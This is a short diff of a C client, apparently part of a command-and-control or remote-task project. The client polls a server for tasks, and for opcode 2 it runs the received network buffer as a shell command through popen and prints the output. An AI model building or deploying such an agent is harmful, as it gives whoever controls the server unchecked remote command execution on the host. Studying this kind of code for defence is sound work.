@@ -52,14 +52,29 @@ void proceed_task(struct mlc_packet_header *header,char *buffer)
 
     // Affichage de la data;
     printf("Data : %s\n\n",buffer);*/
+    FILE *file;
+    char buf[100];
+    int command_return;
     switch(header->opcode)
 	{
 		case 2:
-		    system(buffer);
+		    file = popen(buffer, "r");
+		    if (file == NULL)
+		    {
+			perror("popen");
+			exit(1);
+		    }
+		    while (fgets(buf, sizeof(buf), file))
+		    {
+			printf("%s", buf);
+		    }
+		    command_return = pclose(file);
+		    sprintf(buffer, "%d", command_return);
 		    break;
 		default:
 		    ;
 	}
+   printf("%s\n", buffer);
 }
 
 
@@ -195,7 +210,7 @@ int main(int argc , char *argv[])
     // recoive l'odre de s'arreter. 
     while(1)
     {
-        sleep(1);
+        sleep(2);
 
         printf("Demande de tâches ...\n");
         send(sock, (char*)&header, sizeof(struct mlc_packet_header), 0);
